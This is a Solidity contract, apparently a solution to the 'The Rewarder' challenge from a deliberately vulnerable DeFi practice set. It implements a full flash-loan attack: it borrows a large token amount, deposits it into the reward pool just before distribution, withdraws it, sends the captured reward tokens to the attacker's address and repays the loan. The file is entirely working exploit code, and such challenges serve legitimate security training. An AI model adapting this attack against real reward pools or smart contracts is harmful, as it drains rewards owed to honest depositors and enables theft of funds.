// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

/**
 * @title Attacker
 * @author kyrers
 * @notice This contract executes the full attack. We just need to call the attack function.
 */

contract RewardAttacker {

    DamnValuableToken public immutable dvlToken;
    FlashLoanerPool private immutable flashLoanPool;
    TheRewarderPool private immutable rewarderPool;
    RewardToken public immutable rewardToken;
    address public attacker;

    constructor (address _token, address _pool, address _rewardToken, address _rewardPool) {
        dvlToken = DamnValuableToken(_token);
        flashLoanPool = FlashLoanerPool(_pool);
        rewardToken = RewardToken(_rewardToken);
        rewarderPool = TheRewarderPool(_rewardPool);
        attacker = msg.sender;
    }

    /**
    * @notice Call the flashloan function and get some DVL tokens
    */
    function attack() external {
        flashLoanPool.flashLoan(1000000 ether);
    }

    /**
    * @notice Receive the flashloan, deposit DLV in the pool, collect the rewards, withdraw the DVL tokens, send the rewards to the attacker and pay the flashloan back.
    */
    function receiveFlashLoan(uint256 amount) external {
        dvlToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
        dvlToken.transfer(msg.sender, amount);
    }

    receive() external payable {}
}
